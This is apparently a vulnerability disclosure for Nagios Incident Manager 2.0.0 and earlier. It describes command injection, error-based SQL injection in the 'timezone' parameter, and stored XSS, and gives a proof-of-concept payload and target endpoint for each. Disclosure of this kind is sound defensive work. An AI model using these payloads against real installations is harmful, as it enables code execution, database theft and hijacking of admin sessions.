Affected versions: Nagios Incident Manager <= 2.0.0

+-----------+
|Description|
+-----------+
The Nagios Incident Manager application is vulnerable to multiple
vulnerabilities, including remote code execution via command injection,
SQL injection and stored cross-site scripting.


+------------+
|Exploitation|
+------------+
==Command Injection==
Multiple command injection vulnerabilities exist within the incident
report file generation functionality as user input is passed to system
shell calls without validation. A limited non-administrative user, who
by default does not have permissions to add custom MIME types for
incident file attachments, can exploit these vulnerabilities to obtain
remote code execution on the Incident Manager system as the ‘apache’ user.

"";{touch,/tmp/MYFILE};echo


==SQL Injection==
The Nagios IM admin functionality to update the application settings is
vulnerable to an SQL Injection vulnerability via error-based payloads.
An attacker can inject into the ‘timezone’ POST parameter and retrieve
sensitive information from the application MySQL database.

URL => /nagiosim/admin/settings
Method => POST
Parameter => timezone
Payload => Pacific/Samoa' AND (SELECT 5323 FROM(SELECT
COUNT(*),CONCAT(0x717a7a7171,(MID((IFNULL(CAST(DATABASE() AS
CHAR),0x20)),1,54)),0x7170786a71,FLOOR(RAND(0)*2))x FROM
INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '


==Stored Cross-Site Scripting==
Multiple stored cross-scripting vulnerabilities exist in the Nagios IM
web interface, allowing a standard user to insert malicious JavaScript
payloads into administrative and non-administrative application
functionality. This attack vector could be used by an authenticated
attacker with standard user privileges to hijack the session of an admin
user and extend their permissions within the application (e.g. adding
PHP as a valid MIME type for file attachments).

URL => /nagiosim/incidents/add
Method => POST
Parameters => title, summary, priority, file_description, status
Render => /nagiosim/incidents, /nagiosim/incidents/details/<ID>
POC Payload => <script>alert(1)</script>

Method => POST
Parameters => title

POC Payload => <script>alert(1)</script>

URL => /nagiosim/profile
Method => POST
Parameters => username, first_name, last_name
Render => /nagiosim/admin/users, Global Menu Banner (username)
POC Payload => <script>alert(1)</script>
